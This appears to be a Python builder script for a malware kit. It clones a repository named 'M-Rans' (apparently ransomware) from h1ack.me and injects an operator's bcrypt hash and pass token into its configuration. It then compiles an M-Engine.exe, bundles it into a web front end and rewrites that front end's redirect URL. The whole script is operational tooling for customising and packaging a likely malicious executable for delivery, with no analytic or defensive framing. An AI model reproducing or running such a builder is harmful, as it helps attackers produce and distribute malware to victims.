# auto fast Building... #
# --------------------- #

import os
import shutil
import subprocess

bcrypt_hash = input("Enter NEW BCRYPT HASH: ")
pass_token = input("Enter YOUR NEW PASS TOKEN: ")
redirect_url = input("Enter YOUR NEW REDIRECT URL: ")

print("[+] Cloning repository...")
subprocess.run(["git", "clone", "https://h1ack.me/h1ack/M-Rans.git"], check=True)

os.chdir("M-Rans/M-Engine")

print("[+] Replacing configuration values...")
with open("config.cs", "r", encoding="utf-8") as file:
    content = file.read()

content = content.replace(
    "$2a$12$xp7Fk0XBRwnxC1x4ibYFWe6sr..PFYkfLd0l/E060l27W4ggUrNVS", bcrypt_hash
).replace("PASS-KEY-HERE", pass_token)

with open("config.cs", "w", encoding="utf-8") as file:
    file.write(content)

print("[+] Building project...")
subprocess.run(["dotnet", "build"], check=True)

print("[+] Copying executable file...")
bin_dir = "bin/Debug"
exe_path = None

for root, dirs, files in os.walk(bin_dir):
    if "M-Engine.exe" in files:
        exe_path = os.path.join(root, "M-Engine.exe")
        break

if exe_path:
    shutil.copy(exe_path, "../resources")
else:
    print("[!] ERROR: M-Engine.exe not found!")
    exit(1)

print("[+] Replacing URL in JavaScript file...")
index_js = "assets/index-Ba9fV0lF.js"

with open(index_js, "r", encoding="utf-8") as file:
    js_content = file.read()

js_content = js_content.replace("https://h1ack.me", redirect_url)

with open(index_js, "w", encoding="utf-8") as file:
    file.write(js_content)

print("[+] Running npm build...")
subprocess.run(["npm", "run", "build"], check=True)

print("[✅] Build process completed successfully!")
